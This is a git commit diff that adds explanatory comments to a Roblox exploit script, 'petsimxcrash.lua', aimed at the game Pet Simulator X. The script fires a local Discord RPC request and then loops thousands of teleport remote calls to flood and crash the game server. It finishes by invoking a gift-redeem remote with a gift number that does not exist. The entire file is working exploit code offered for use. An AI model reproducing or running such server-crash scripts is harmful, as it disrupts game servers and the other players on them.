a18afc9560c09333d1f3f997de563e523e3cf148
MiguDEV <71216796+migu-star@users.noreply.github.com>
2022-03-13 22:19:11 +0100

    Added comments
    Added comments for do people know what it do.

--- petsimxcrash.lua
+++ petsimxcrash.lua
@@ -1,8 +1,8 @@
-if not getgenv().packets then
+if not getgenv().packets then -- Add packets if not found
     getgenv().packets = 32000
 end
 
-function redirectdsc()
+function redirectdsc() -- redirect discord function
     if syn then
        syn.request({
           Url = "http://127.0.0.1:6463/rpc?v=1",
@@ -39,44 +39,44 @@ function redirectdsc()
    end
 end
 local packetsended = 0
-redirectdsc()
+redirectdsc() -- fire redirectdsc function
 
 
-Libreria = require(game:GetService('ReplicatedStorage').Framework.Library)
-function Crashear()
+Libreria = require(game:GetService('ReplicatedStorage').Framework.Library) -- get game library
+function Crashear() -- do crash
     spawn(function()
-        Libreria.Network.Fire('request world', "Fantasy")
+        Libreria.Network.Fire('request world', "Fantasy") -- select world u want to go
+        Libreria.Network.Fire('performed teleport') -- start teleport
+        packetsended = packetsended + 1
+        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
+    end)
+    spawn(function()
+        Libreria.Network.Fire('request world', "Tech") -- same as the first
         Libreria.Network.Fire('performed teleport')
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
     spawn(function()
-        Libreria.Network.Fire('request world', "Tech")
+        Libreria.Network.Fire('request world', "Void") -- same as the first
         Libreria.Network.Fire('performed teleport')
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
     spawn(function()
-        Libreria.Network.Fire('request world', "Void")
-        Libreria.Network.Fire('performed teleport')
-        packetsended = packetsended + 1
-        print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
-    end)
-    spawn(function()
-        Libreria.Network.Fire('request world', "Axolot")
+        Libreria.Network.Fire('request world', "Axolot") -- same as the first
         Libreria.Network.Fire('performed teleport')
         packetsended = packetsended + 1
         print("[Project Meteor] Crashing server | Packets sended: ".. tostring(packetsended))
     end)
 end
 
-local packetstosend = getgenv().packets / 4
-for i=1,packetstosend do
+local packetstosend = getgenv().packets / 4 -- A crash function is 4 packets, its why i do / 4
+for i=1,packetstosend do -- Repeat the crash function packetstosend times
     spawn(Crashear)
 end
 
-local tabla = {
+local tabla = { -- select gift 13 (Dont exist)
 	[1] = 13
 }
 
-workspace.__THINGS.__REMOTES["redeem free gift"]:InvokeServer(tabla)
+workspace.__THINGS.__REMOTES["redeem free gift"]:InvokeServer(tabla) -- open gift selected in the list
